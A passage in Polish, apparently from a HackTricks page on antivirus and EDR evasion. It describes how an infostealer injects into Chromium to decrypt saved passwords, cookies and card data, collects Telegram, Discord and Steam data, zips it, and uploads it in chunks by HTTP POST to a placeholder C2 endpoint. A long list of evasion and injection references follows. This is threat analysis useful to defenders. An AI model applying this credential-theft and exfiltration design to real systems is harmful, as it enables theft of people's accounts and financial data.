- Procedury ChromElevator używają direct-syscall reflective process hollowing do wstrzyknięcia kodu do działającej przeglądarki Chromium, dziedziczą klucze AppBound Encryption i odszyfrowują hasła/pliki cookie/dane kart kredytowych bezpośrednio z baz danych SQLite mimo zabezpieczeń ABE.


### Modułowe gromadzenie danych w pamięci i eksfiltracja HTTP w porcjach

- `create_memory_based_log` iteruje po globalnej tablicy wskaźników do funkcji `memory_generators` i uruchamia jeden wątek dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarki itp.). Każdy wątek zapisuje wyniki do współdzielonych buforów i po około 45-sekundowym oczekiwaniu na zakończenie wątków podaje liczbę swoich plików.
- Po zakończeniu wszystkie dane są kompresowane za pomocą statycznie dołączonej biblioteki `miniz` do pliku `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` czeka 15 s i przesyła archiwum strumieniowo w porcjach po 10 MB za pomocą HTTP POST na adres `http://<C2>:6767/upload`, podszywając się pod przeglądarkę za pomocą granicy `multipart/form-data` (`----WebKitFormBoundary***`). Do każdej porcji dodawane są nagłówki `User-Agent: upload`, `auth: <build_id>` i opcjonalnie `w: <campaign_tag>`, a do ostatniej porcji dołączane jest `complete: true`, aby C2 wiedział, że ponowne składanie zostało zakończone.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-based .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - 2CLoader technical analysis](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)

{{#include ../banners/hacktricks-training.md}}
